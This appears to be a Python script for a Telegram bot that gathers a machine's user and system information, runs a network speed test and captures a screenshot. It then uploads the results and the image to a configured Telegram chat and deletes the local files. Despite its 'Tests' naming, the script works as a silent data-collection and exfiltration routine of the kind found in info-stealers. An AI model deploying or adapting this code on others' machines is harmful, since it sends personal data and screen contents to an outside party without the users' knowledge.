from datetime import datetime
import telebot
import json
from itertools import chain
from Tests import Networking, Screenshot, UserInfoTest
import time
import threading
from os import remove
import sys

# config settings
config = json.load(open("config.json"))
bot = telebot.TeleBot(config['token'], parse_mode="Markdown")
botTasks = {key: val for key, val in zip(config['tasks'], [' '] * len(config['tasks']))}
starts = datetime.now()


def scheduler(beginTimer):
    animation = ['-', '\\', '|', '/', '-', '\\', '|', '/', '-']
    animationIndex = 0
    scheduledTasks = ("- [{}] {}\n" * len(botTasks)).format(*list(chain.from_iterable([[task, status] for status, task in botTasks.items()])))
    messageText = "``` New job has been started at {}. Working ... {}\n{}```"
    startMessage = bot.send_message(chat_id=config['userSession'],
                                    text=messageText.format(beginTimer, animation[animationIndex], scheduledTasks))
    while True:
        time.sleep(1)
        scheduledTasks = ("- [{}] {}\n" * len(botTasks)).format(*list(chain.from_iterable([[task, status] for status, task in botTasks.items()])))
        bot.edit_message_text(chat_id=config['userSession'],
                              message_id=startMessage.message_id,
                              text=messageText.format(beginTimer, animation[animationIndex+1], scheduledTasks))
        if animationIndex < len(animation) - 2:
            animationIndex += 1
        else:
            animationIndex = 0


def testRunner(beginTimer):
    frontendThread = threading.Thread(target=scheduler, args=(str(beginTimer)[:-7],))
    frontendThread.start()
    
    client = UserInfoTest.getUserInfo()
    botTasks['Get user data'] = 'x'
    network = Networking.calculateNetworkSpeedTest()
    botTasks['Test network speed'] = 'x'
    
    results = {
        "network information": network,
        "system information": client
    }
    open("dumps.json", 'w').write(json.dumps(results, indent=4))
    bot.send_document(chat_id=config['userSession'], data=open("dumps.json", 'rb'))
    remove("dumps.json")
    try:
        Screenshot.makeScreenshot()
        bot.send_photo(chat_id=config['userSession'], photo=open('image1.png', 'rb'))
        botTasks['Take screenshot'] = 'x'
        remove("image1.png")
    except Exception:
        bot.send_message(chat_id=config['userSession'], text="Attempt to make screenshot *failed*")
    
    
    ends = datetime.now()
    workSpeedTest = ends - starts
    bot.send_message(chat_id=config['userSession'], text="``` It took {} to complete task ```".format(str(workSpeedTest)[:-7]))
    sys.exit("My work is done!")

if __name__ == "__main__":
    testRunner(datetime.now())